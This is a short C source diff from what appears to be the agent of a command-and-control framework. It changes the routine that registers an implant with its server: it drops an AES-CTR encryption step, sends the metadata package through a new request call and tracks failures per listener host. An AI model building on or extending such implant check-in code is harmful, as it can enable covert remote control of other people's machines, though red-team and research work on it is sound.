@@ -326,27 +326,15 @@ INT PackageSendMetaDataPackage(pPackage pack, PVOID pResponse, PSIZE_T pSize) {
 	if (!pack->Buffer)
 		return PACKAGE_BUFFER_DOES_NOT_EXIST;
 
-	AddInt32ToBuffer(pack->Buffer, pack->Length); // add the length of the buffer to the front of buffer in empty space created when calling create metadata package.
-
-	if (pack->Encrypt)
-	{
-		INT err;
-		//TODO perform encryption.
-		if ((err = AESCTR(
-			(BYTE*)pack->Buffer + (PACKAGE_HEADER_LENGTH + sizeof(INT) + StringLengthA(agent->config->AgentName) + agent->EncryptedAESKeySize + agent->EncryptedIVSize),	//buffer to encrypt. BUFF START + HEADERS + AgentName Length + AgentName String Length (part of Headers) + ENCRYPTED KEY LENGTH + PREENCRYPTED AESKEY + ENCRYPTED IV LENGTH + PREENCRYPTED IV
-			pack->Length - (PACKAGE_HEADER_LENGTH + sizeof(INT) + StringLengthA(agent->config->AgentName) + agent->EncryptedAESKeySize + agent->EncryptedIVSize),			//SIZE OF BUFFER TO ENCRYPT. BUFFER LEN - (HEADERS + AgentName Length + AgentName String Length (part of Headers)) - (ENCRYPTED KEY LENGTH + PREENCRYPTED AESKEY + ENCRYPTED IV LENGTH + PREENCRYPTED IV)
-			agent->AESKey, AES_256_KEY_SIZE, agent->IV)																//AES KEY, AES KEY SIZE, IV
-			) != 0) {
-			return err;
-		}
-	}
-
 	//TODO perform sending of package.
-	if (!(Success = SendRegisterRequest(agent->MetaDataPackage->Buffer, agent->MetaDataPackage->Length))) {
+	if (PerformRequest(agent->MetaDataPackage->Buffer, agent->MetaDataPackage->Length, NULL)) {
+		agent->session->Active = TRUE;
+		return PACKAGE_SUCCESS;
+	}
+	else {
+		agent->config->listenerConfig->CurrentHost->NumFailures++;
 		return PACKAGE_HAS_NOT_BEEN_SENT_TO_SERVER;
 	}
-
-	return PACKAGE_SUCCESS;
 } 
 
 BOOL PackageSendAll(OUT pDataBuffer Response, OUT PSIZE_T Size)
